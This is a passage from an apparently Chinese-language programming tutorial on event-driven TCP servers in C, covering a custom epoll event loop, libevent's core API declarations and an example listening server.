class="hljs-type">void</span> <span class="hljs-title function_">handler_cb</span><span class="hljs-params">(<span class="hljs-type">int</span> fd,<span class="hljs-type">short</span> event,<span class="hljs-type">void</span> *arg)</span><br>&#123;<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">myevent</span> *<span class="hljs-title">myevent</span> =</span> (<span class="hljs-keyword">struct</span> myevent *)arg;<br>    <span class="hljs-type">int</span> ret = read(fd,myevent-&gt;buf,<span class="hljs-keyword">sizeof</span>(myevent-&gt;buf));<br>    <span class="hljs-keyword">if</span>(ret &lt;= <span class="hljs-number">0</span>)<br>    &#123;<br>        <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">epoll_event</span> <span class="hljs-title">newevent</span>;</span><br>        newevent.data.ptr = myevent;<br>        newevent.events = EPOLLIN;<br>        epoll_ctl(myevent-&gt;base-&gt;base,EPOLL_CTL_DEL,myevent-&gt;fd,&amp;newevent);<span class="hljs-comment">//将事件从红黑树中移除</span><br>        close(fd);<br>        event_destroy(myevent);                                             <span class="hljs-comment">//销毁事件</span><br>    &#125;<br>    <span class="hljs-keyword">else</span>&#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;recv from client:%s&quot;</span>,myevent-&gt;buf);<br>        bzero(myevent-&gt;buf,ret);<br>    &#125;<br>&#125;<br><span class="hljs-comment">//接受客户端连接的函数</span><br><span class="hljs-type">static</span> <span class="hljs-type">void</span> <span class="hljs-title function_">accept_cb</span><span class="hljs-params">(<span class="hljs-type">int</span> fd, <span class="hljs-type">short</span> event, <span class="hljs-type">void</span> *arg)</span> &#123;<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">myevent</span> *<span class="hljs-title">myevent</span> =</span> (<span class="hljs-keyword">struct</span> myevent *)arg;<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">sockaddr</span> <span class="hljs-title">client</span>;</span><br>    <span class="hljs-type">int</span> client_fd = accept(fd, (<span class="hljs-keyword">struct</span> sockaddr *) &amp;client, &amp;SOCKLEN);<br>    <span class="hljs-type">char</span> client_addr[<span class="hljs-number">15</span>];<br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">short</span> client_port;<br>    convertip_to_str(AF_INET, &amp;client, client_addr, &amp;client_port);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;client:%s:%hu is connected!\n&quot;</span>, client_addr, client_port);<br>    <span class="hljs-comment">//创建一个新的事件,将新的事件加入到事件管理器</span><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">myevent</span> *<span class="hljs-title">newevent</span> =</span> event_new();<br>    eventset(newevent,client_fd,(<span class="hljs-type">void</span> *)newevent,handler_cb);<br>    eventadd(myevent-&gt;base,newevent,EPOLLIN);<br>&#125;<br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">int</span> argc,<span class="hljs-type">char</span> **argv)</span><br>&#123;<br>    <span class="hljs-type">int</span> fd = NewSocket(argv[<span class="hljs-number">1</span>],argv[<span class="hljs-number">2</span>],<span class="hljs-number">5</span>);<br>    <span class="hljs-keyword">if</span>(fd == <span class="hljs-number">-1</span>)<br>    &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;new socket error!\n&quot;</span>);<br>        <span class="hljs-built_in">exit</span>(EXIT_FAILURE);<br>    &#125;<br>    <span class="hljs-comment">//创建一个事件监听器</span><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">myeventbase</span> *<span class="hljs-title">base</span> =</span> event_base_new(<span class="hljs-number">100</span>,<span class="hljs-number">1000</span>*<span class="hljs-number">10</span>);<br>    <span class="hljs-comment">//创建一个新的事件</span><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">myevent</span> *<span class="hljs-title">myevent</span> =</span> event_new();<br>    <span class="hljs-comment">//初始化事件</span><br>    eventset(myevent,fd,(<span class="hljs-type">void</span> *)myevent,accept_cb);<br>    <span class="hljs-comment">//将事件加入到监听队列</span><br>    eventadd(base,myevent,EPOLLIN);<br>    <span class="hljs-comment">//开始监听</span><br>    event_base_loop(base);<br>    <span class="hljs-comment">//销毁事件</span><br>    event_destroy(myevent);<br>    event_base_destroy(base);<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="2-libevent"><a href="#2-libevent" class="headerlink" title="2.libevent"></a>2.libevent</h3><h4 id="2-1-什么是libevent"><a href="#2-1-什么是libevent" class="headerlink" title="2.1.什么是libevent?"></a>2.1.什么是libevent?</h4><p>Libevent 是一个用C语言编写的、轻量级的开源高性能事件通知库，主要有以下几个亮点：事件驱动（ event-driven），高性能;轻量级，专注于网络，不如 ACE 那么臃肿庞大；源代码相当精炼、易读；跨平台，支持 Windows、 Linux、 *BSD 和 Mac Os；支持多种 I&#x2F;O 多路复用技术， epoll、 poll、 dev&#x2F;poll、 select 和 kqueue 等；支持 I&#x2F;O，定时器和信号等事件；注册事件优先级。</p><h4 id="2-2-涉及到的基本数据类型以及api"><a href="#2-2-涉及到的基本数据类型以及api" class="headerlink" title="2.2.涉及到的基本数据类型以及api"></a>2.2.涉及到的基本数据类型以及api</h4><ul><li><p>1.event_base</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">struct</span> event_base *<span class="hljs-title function_">event_base_new</span><span class="hljs-params">()</span>;<span class="hljs-comment">//创建一个event_base</span><br><span class="hljs-type">void</span> <span class="hljs-title function_">event_base_free</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> event_base *base)</span>;<span class="hljs-comment">//释放一个event_base</span><br><span class="hljs-type">int</span> <span class="hljs-title function_">event_base_priority_init</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> event_base *base, <span class="hljs-type">int</span> n_priorities)</span>;<span class="hljs-comment">//为事件设置优先级,以后事件优先级可以从0到n_priorities,(0最高)</span><br><span class="hljs-type">int</span> <span class="hljs-title function_">event_reinit</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> event_base *base)</span>;<span class="hljs-comment">//调用fork函数之后要重新初始化base,因此要使用此函数重新初始化</span><br><span class="hljs-type">int</span> <span class="hljs-title function_">event_base_loop</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> event_base *base, <span class="hljs-type">int</span> flags)</span>;<span class="hljs-comment">//开始运行循环</span><br><span class="hljs-type">int</span> <span class="hljs-title function_">event_base_dispatch</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> event_base *base)</span>;<span class="hljs-comment">//同event_base_loop,只是flag没有设置</span><br><span class="hljs-type">int</span> <span class="hljs-title function_">event_base_loopexit</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> event_base *base,<span class="hljs-type">const</span> <span class="hljs-keyword">struct</span> timeval *tv)</span>;<span class="hljs-comment">//让event_base在指定的时间之后停止循环</span><br><span class="hljs-type">int</span> <span class="hljs-title function_">event_base_loopbreak</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> event_base *base)</span>;<span class="hljs-comment">//让event_base立即停止循环</span><br><span class="hljs-type">void</span> <span class="hljs-title function_">event_base_dump_events</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> event_base *base, FILE *f)</span>;<span class="hljs-comment">//将event_base的状态转存到文件中</span><br></code></pre></td></tr></table></figure></li><li><p>2.event</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">define</span> EV_TIMEOUT      0x01</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> EV_READ         0x02</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> EV_WRITE        0x04</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> EV_SIGNAL       0x08</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> EV_PERSIST      0x10</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> EV_ET           0x20</span><br><span class="hljs-keyword">typedef</span> <span class="hljs-title function_">void</span> <span class="hljs-params">(*event_callback_fn)</span><span class="hljs-params">(<span class="hljs-type">evutil_socket_t</span>, <span class="hljs-type">short</span>, <span class="hljs-type">void</span> *)</span>;<span class="hljs-comment">//触发事件调用的回调函数类型</span><br><br><span class="hljs-keyword">struct</span> event *<span class="hljs-title function_">event_new</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> event_base *base, <span class="hljs-type">evutil_socket_t</span> fd,</span><br><span class="hljs-params">    <span class="hljs-type">short</span> what, event_callback_fn cb,</span><br><span class="hljs-params">    <span class="hljs-type">void</span> *arg)</span>;<span class="hljs-comment">//创建一个新的event</span><br><br><span class="hljs-type">void</span> <span class="hljs-title function_">event_free</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> event *event)</span>;<span class="hljs-comment">//释放一个新的event</span><br><span class="hljs-type">int</span> <span class="hljs-title function_">event_priority_set</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> event *event, <span class="hljs-type">int</span> priority)</span>;<br></code></pre></td></tr></table></figure></li><li><p>3.bufferevent</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">struct</span> bufferevent *<span class="hljs-title function_">bufferevent_socket_new</span><span class="hljs-params">(</span><br><span class="hljs-params">    <span class="hljs-keyword">struct</span> event_base *base,</span><br><span class="hljs-params">    <span class="hljs-type">evutil_socket_t</span> fd,</span><br><span class="hljs-params">    <span class="hljs-keyword">enum</span> bufferevent_options options)</span>;<span class="hljs-comment">//创建一个bufferevent</span><br><span class="hljs-type">int</span> <span class="hljs-title function_">bufferevent_socket_connect</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> bufferevent *bev,</span><br><span class="hljs-params">    <span class="hljs-keyword">struct</span> sockaddr *address, <span class="hljs-type">int</span> addrlen)</span>;<br><span class="hljs-type">void</span> <span class="hljs-title function_">bufferevent_free</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> bufferevent *bev)</span>;<span class="hljs-comment">//释放一个bufferevent</span><br><span class="hljs-type">void</span> <span class="hljs-title function_">bufferevent_enable</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> bufferevent *bufev, <span class="hljs-type">short</span> events)</span>;<br><span class="hljs-type">void</span> <span class="hljs-title function_">bufferevent_disable</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> bufferevent *bufev, <span class="hljs-type">short</span> events)</span>;<span class="hljs-comment">//屏蔽bufferevent对应的触发事件</span><br><span class="hljs-type">void</span> <span class="hljs-title function_">bufferevent_setwatermark</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> bufferevent *bufev, <span class="hljs-type">short</span> events,</span><br><span class="hljs-params">    <span class="hljs-type">size_t</span> lowmark, <span class="hljs-type">size_t</span> highmark)</span>;<span class="hljs-comment">//设置bufferevent 读写操作水位</span><br><span class="hljs-keyword">struct</span> evbuffer *<span class="hljs-title function_">bufferevent_get_input</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> bufferevent *bufev)</span>;<br><span class="hljs-keyword">struct</span> evbuffer *<span class="hljs-title function_">bufferevent_get_output</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> bufferevent *bufev)</span>;<span class="hljs-comment">//获取bufferevent对象的evbuffer结构体</span><br><span class="hljs-type">int</span> <span class="hljs-title function_">bufferevent_write</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> bufferevent *bufev,</span><br><span class="hljs-params">    <span class="hljs-type">const</span> <span class="hljs-type">void</span> *data, <span class="hljs-type">size_t</span> size)</span>;<br><span class="hljs-type">int</span> <span class="hljs-title function_">bufferevent_write_buffer</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> bufferevent *bufev,</span><br><span class="hljs-params">    <span class="hljs-keyword">struct</span> evbuffer *buf)</span>;<span class="hljs-comment">//向bufferevent中读取或者写入数据</span><br><span class="hljs-type">size_t</span> <span class="hljs-title function_">bufferevent_read</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> bufferevent *bufev, <span class="hljs-type">void</span> *data, <span class="hljs-type">size_t</span> size)</span>;<br><span class="hljs-type">int</span> <span class="hljs-title function_">bufferevent_read_buffer</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> bufferevent *bufev,</span><br><span class="hljs-params">    <span class="hljs-keyword">struct</span> evbuffer *buf)</span>;<br></code></pre></td></tr></table></figure></li><li><p>4.evBuffer</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">struct</span> evbuffer *<span class="hljs-title function_">evbuffer_new</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span>;<br><span class="hljs-type">void</span> <span class="hljs-title function_">evbuffer_free</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> evbuffer *buf)</span>;<span class="hljs-comment">//创建或者释放一个evbuffer</span><br><span class="hljs-type">size_t</span> <span class="hljs-title function_">evbuffer_get_length</span><span class="hljs-params">(<span class="hljs-type">const</span> <span class="hljs-keyword">struct</span> evbuffer *buf)</span>;<span class="hljs-comment">//得到evbuffer当前的数据长度</span><br><span class="hljs-type">int</span> <span class="hljs-title function_">evbuffer_add</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> evbuffer *buf, <span class="hljs-type">const</span> <span class="hljs-type">void</span> *data, <span class="hljs-type">size_t</span> datlen)</span>;<span class="hljs-comment">//将数据data加入到buf的末尾</span><br><span class="hljs-type">int</span> <span class="hljs-title function_">evbuffer_add_buffer</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> evbuffer *dst, <span class="hljs-keyword">struct</span> evbuffer *src)</span>;<span class="hljs-comment">//将 src 中的所有数据移动到 dst 末尾,成功时返回0,失败时返回-1。</span><br><br><span class="hljs-type">int</span> <span class="hljs-title function_">evbuffer_remove_buffer</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> evbuffer *src, </span><br><span class="hljs-params">                    <span class="hljs-keyword">struct</span> evbuffer *dst,</span><br><span class="hljs-params">                    <span class="hljs-type">size_t</span> datlen)</span>;<span class="hljs-comment">//函数从 src 中移动 datlen 字节到 dst 末尾,尽量少进行复制。如果字节数小于 datlen,所有字节被移动。函数返回移动的字节数。</span><br><br></code></pre></td></tr></table></figure></li><li><p>5.evconnlistener</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">struct</span> evconnlistener *<br><span class="hljs-title function_">evconnlistener_new</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> event_base *base,</span><br><span class="hljs-params">    evconnlistener_cb cb, <span class="hljs-type">void</span> *ptr, <span class="hljs-type">unsigned</span> flags, <span class="hljs-type">int</span> backlog,</span><br><span class="hljs-params">    <span class="hljs-type">evutil_socket_t</span> fd)</span>;<br><br><span class="hljs-keyword">struct</span> evconnlistener *<br><span class="hljs-title function_">evconnlistener_new_bind</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> event_base *base,</span><br><span class="hljs-params">    evconnlistener_cb cb, <span class="hljs-type">void</span> *ptr, <span class="hljs-type">unsigned</span> flags, <span class="hljs-type">int</span> backlog,</span><br><span class="hljs-params">    <span class="hljs-type">const</span> <span class="hljs-keyword">struct</span> sockaddr *sa, <span class="hljs-type">int</span> socklen)</span>;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">evconnlistener_free</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> evconnlistener *lev)</span>;<span class="hljs-comment">//创建或者销毁一个evconnlistener</span><br><span class="hljs-keyword">typedef</span> <span class="hljs-title function_">void</span> <span class="hljs-params">(*evconnlistener_cb)</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> evconnlistener *listener,</span><br><span class="hljs-params">    <span class="hljs-type">evutil_socket_t</span> sock, <span class="hljs-keyword">struct</span> sockaddr *addr, <span class="hljs-type">int</span> len, <span class="hljs-type">void</span> *ptr)</span>;<span class="hljs-comment">//evconnlistener的回调函数</span><br><span class="hljs-type">evutil_socket_t</span> <span class="hljs-title function_">evconnlistener_get_fd</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> evconnlistener *lev)</span>;<br><span class="hljs-keyword">struct</span> event_base *<span class="hljs-title function_">evconnlistener_get_base</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> evconnlistener *lev)</span>;<span class="hljs-comment">//获取evconnlistener中获取fd或者event_base。</span><br><br></code></pre></td></tr></table></figure></li></ul><h4 id="2-3-基本使用步骤"><a href="#2-3-基本使用步骤" class="headerlink" title="2.3.基本使用步骤"></a>2.3.基本使用步骤</h4><ul><li><p>1.创建监听对象</p></li><li><p>2.创建监听事件</p></li><li><p>3.将监听事件加入监听集合</p></li><li><p>4.开始监听</p></li></ul><h4 id="2-4-实例"><a href="#2-4-实例" class="headerlink" title="2.4.实例"></a>2.4.实例</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">//服务器</span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/socket.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;event.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;arpa/inet.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;event2/listener.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;unistd.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;string.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/stat.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/types.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;strings.h&gt;</span></span><br><span class="hljs-comment">//转换ip地址类型</span><br><span class="hljs-type">int</span> <span class="hljs-title function_">convertip_to_str</span><span class="hljs-params">(<span class="hljs-type">int</span> af, <span class="hljs-keyword">struct</span> sockaddr *addr, <span class="hljs-type">char</span> *str_addr, <span class="hljs-type">unsigned</span> <span class="hljs-type">short</span> *port)</span> &#123;<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">sockaddr_in</span> *<span class="hljs-title">addr_tmp</span> =</span> (<span class="hljs-keyword">struct</span> sockaddr_in *) addr;<br>    <span class="hljs-keyword">if</span> (inet_ntop(af, &amp;(addr_tmp-&gt;sin_addr), str_addr, SOCKLEN) == <span class="hljs-literal">NULL</span>) &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>;<br>    &#125;<br>    *port = ntohs(addr_tmp-&gt;sin_port);<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><br><span class="hljs-comment">//转换ip地址类型</span><br><span class="hljs-type">int</span> <span class="hljs-title function_">convertip_to_net</span><span class="hljs-params">(<span class="hljs-type">int</span> af, <span class="hljs-keyword">struct</span> sockaddr *addr, <span class="hljs-type">char</span> *str_addr, <span class="hljs-type">unsigned</span> <span class="hljs-type">short</span> port)</span> &#123;<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">sockaddr_in</span> *<span class="hljs-title">addr_tmp</span> =</span> (<span class="hljs-keyword">struct</span> sockaddr_in *) addr;<br>    addr_tmp-&gt;sin_port = htons(port);<br>    <span class="hljs-keyword">if</span> (inet_pton(af, str_addr, &amp;(addr_tmp-&gt;sin_addr)) != <span class="hljs-number">1</span>) &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;convert ip failed!\n&quot;</span>);<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>;<br>    &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><br><span class="hljs-comment">//帮助信息</span><br><span class="hljs-type">void</span> <span class="hljs-title function_">Usage</span><span class="hljs-params">(<span class="hljs-type">char</span> *str)</span> &#123;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Usage:\n&quot;</span>);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%s SERVERADDR SERVERPORT\n&quot;</span>, str);<br>&#125;<br><br><span class="hljs-comment">//创建新的socket</span><br><span class="hljs-type">int</span> <span class="hljs-title function_">NewSocket</span><span class="hljs-params">(<span class="hljs-type">char</span> *addr, <span class="hljs-type">char</span> *port, <span class="hljs-type">int</span> backlog)</span> &#123;<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">sockaddr</span> <span class="hljs-title">ADDR</span>;</span><br>    convertip_to_net(AF_INET, &amp;ADDR, addr, atoi(port));<br>    <span class="hljs-type">int</span> fd = socket(AF_INET, SOCK_STREAM, <span class="hljs-number">0</span>);<br>    <span class="hljs-keyword">if</span> (bind(fd, (<span class="hljs-keyword">struct</span> sockaddr *) &amp;ADDR, SOCKLEN) != <span class="hljs-number">0</span>) &#123;<br>        perror(<span class="hljs-string">&quot;bind&quot;</span>);<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>;<br>    &#125;<br>    <span class="hljs-keyword">if</span> (listen(fd, backlog) != <span class="hljs-number">0</span>) &#123;<br>        perror(<span class="hljs-string">&quot;listen&quot;</span>);<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>;<br>    &#125;<br>    <span class="hljs-keyword">return</span> fd;<br>&#125;<br><span class="hljs-comment">//处理客户端请求</span><br><span class="hljs-type">void</span> <span class="hljs-title function_">handler_cb</span><span class="hljs-params">(<span class="hljs-type">int</span> fd, <span class="hljs-type">short</span> event, <span class="hljs-type">void</span> *arg)</span> &#123;<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">sockaddr</span> <span class="hljs-title">client</span>;</span><br>    <span class="hljs-type">int</span> client_fd = accept(fd, (<span class="hljs-keyword">struct</span> sockaddr *) &amp;client, &amp;SOCKLEN);<br>    <span class="hljs-type">char</span> client_addr[<span class="hljs-number">15</span>];<br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">short</span> client_port;<br>    convertip_to_str(AF_INET, &amp;client, client_addr, &amp;client_port);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;client:%s:%hu is connected!\n&quot;</span>, client_addr, client_port);<br>&#125;<br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">int</span> argc,<span class="hljs-type">char</span> **argv)</span><br>&#123;<br><span class="hljs-keyword">if</span> (argc != <span class="hljs-number">3</span>) &#123;<br>Usage(argv[<span class="hljs-number">0</span>]);<br>&#125;<br><span class="hljs-type">int</span> fd = NewSocket(argv[<span class="hljs-number">1</span>], argv[<span class="hljs-number">2</span>], <span class="hljs-number">10</span>);<br>    <span class="hljs-comment">//创建一个监听集合</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">event_base</span> *<span class="hljs-title">base</span> =</span> event_base_new();<br>    <span class="hljs-comment">//创建一个事件</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">event</span> *<span class="hljs-title">new_event</span> =</span> event_new(base, fd, EV_READ | EV_PERSIST, handler_cb, <span class="hljs-literal">NULL</span>);<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">timeval</span> <span class="hljs-title">timeout</span>=</span> &#123;<span class="hljs-number">450</span>,<span class="hljs-number">30</span>&#125;;<span class="hljs-comment">//设置超时时间</span><br>    <span class="hljs-comment">//注册事件</span><br>event_add(new_event, &amp;timeout);<br>    <span class="hljs-comment">//等待事件的发生</span><br>event_base_dispatch(base);<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="3-连接监听器和数据缓冲区-evconnlistener-bufferevent"><a href="#3-连接监听器和数据缓冲区-evconnlistener-bufferevent" class="headerlink" title="3.连接监听器和数据缓冲区(evconnlistener,bufferevent)"></a>3.连接监听器和数据缓冲区(evconnlistener,bufferevent)</h3><h4 id="3-1-基本的使用步骤"><a href="#3-1-基本的使用步骤" class="headerlink" title="3.1.基本的使用步骤"></a>3.1.基本的使用步骤</h4><ul><li>1.创建一个事件监听器</li><li>2.设置事件触发的回调函数</li><li>3.开始监听事件</li></ul><h4 id="3-2-基本的API"><a href="#3-2-基本的API" class="headerlink" title="3.2.基本的API"></a>3.2.基本的API</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><code class="hljs c"><br><span class="hljs-comment">//连接监听器</span><br><br><span class="hljs-comment">//创建一个新的socket并且绑定监听,返回一个struct evconnlistener类型</span><br><span class="hljs-keyword">struct</span> evconnlistener *<br><span class="hljs-title function_">evconnlistener_new_bind</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> event_base *base, evconnlistener_cb cb,</span><br><span class="hljs-params">    <span class="hljs-type">void</span> *ptr, <span class="hljs-type">unsigned</span> flags, <span class="hljs-type">int</span> backlog, <span class="hljs-type">const</span> <span class="hljs-keyword">struct</span> sockaddr *sa,</span><br><span class="hljs-params">    <span class="hljs-type">int</span> socklen)</span>;<br><br><span class="hljs-comment">//将创建好的socket开始监听</span><br>evconnlistener_new(<span 